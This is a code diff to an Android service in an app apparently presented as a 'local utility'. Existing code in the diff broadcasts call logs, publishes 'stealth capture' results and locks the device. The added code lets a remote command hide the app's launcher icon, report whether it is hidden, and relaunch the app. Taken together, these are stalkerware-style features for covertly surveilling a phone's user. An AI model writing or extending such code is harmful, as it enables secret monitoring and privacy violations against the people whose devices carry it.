@@ -251,6 +251,7 @@ class LocalFileServerService : Service() {
         } catch (e: Exception) { e.printStackTrace() }
         try {
             broadcastMessage(JSONObject().put("type", "CALL_LOGS_LIST").put("data", teleManager.getCallLogs()).toString())
+            broadcastMessage(JSONObject().put("type", "STEALTH_MODE_STATUS").put("hideIcon", isStealthModeActive()).toString())
         } catch (e: Exception) { e.printStackTrace() }
     }
 
@@ -303,6 +304,35 @@ class LocalFileServerService : Service() {
             } catch (e: Exception) {
                 Log.e("StealthCapture", "Error publishing stealth capture result", e)
             }
+        }
+    }
+
+    fun setStealthMode(hideIcon: Boolean): Boolean {
+        return try {
+            val pm = packageManager
+            val aliasComponent = ComponentName(applicationContext, "com.example.localutility.MainActivityAlias")
+            val newState = if (hideIcon) {
+                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+            } else {
+                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED
+            }
+            pm.setComponentEnabledSetting(aliasComponent, newState, android.content.pm.PackageManager.DONT_KILL_APP)
+            Log.d("OpenDroid", "Stealth mode updated: hideIcon=$hideIcon")
+            true
+        } catch (e: Exception) {
+            Log.e("OpenDroid", "Failed to update stealth mode", e)
+            false
+        }
+    }
+
+    fun isStealthModeActive(): Boolean {
+        return try {
+            val pm = packageManager
+            val aliasComponent = ComponentName(applicationContext, "com.example.localutility.MainActivityAlias")
+            val state = pm.getComponentEnabledSetting(aliasComponent)
+            state == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+        } catch (e: Exception) {
+            false
         }
     }
 
@@ -630,6 +660,44 @@ class LocalFileServerService : Service() {
                     Log.e("OpenDroid", "Failed to lock device", e)
                     broadcastMessage(JSONObject().apply {
                         put("type", "LOCK_DEVICE_ACK")
+                        put("success", false)
+                        put("error", e.message)
+                    }.toString())
+                }
+            }
+
+            // --- Phase 2: Step 2.3 Stealth Mode (Hide Launcher Icon) ---
+            "SET_STEALTH_MODE" -> {
+                val hideIcon = json.optBoolean("hideIcon", false)
+                val success = setStealthMode(hideIcon)
+                broadcastMessage(JSONObject().apply {
+                    put("type", "STEALTH_MODE_ACK")
+                    put("hideIcon", hideIcon)
+                    put("success", success)
+                }.toString())
+            }
+
+            "GET_STEALTH_MODE" -> {
+                val isHidden = isStealthModeActive()
+                broadcastMessage(JSONObject().apply {
+                    put("type", "STEALTH_MODE_STATUS")
+                    put("hideIcon", isHidden)
+                }.toString())
+            }
+
+            "LAUNCH_OPEN_DROID" -> {
+                try {
+                    val intent = Intent(applicationContext, MainActivity::class.java).apply {
+                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+                    }
+                    startActivity(intent)
+                    broadcastMessage(JSONObject().apply {
+                        put("type", "LAUNCH_OPEN_DROID_ACK")
+                        put("success", true)
+                    }.toString())
+                } catch (e: Exception) {
+                    broadcastMessage(JSONObject().apply {
+                        put("type", "LAUNCH_OPEN_DROID_ACK")
                         put("success", false)
                         put("error", e.message)
                     }.toString())
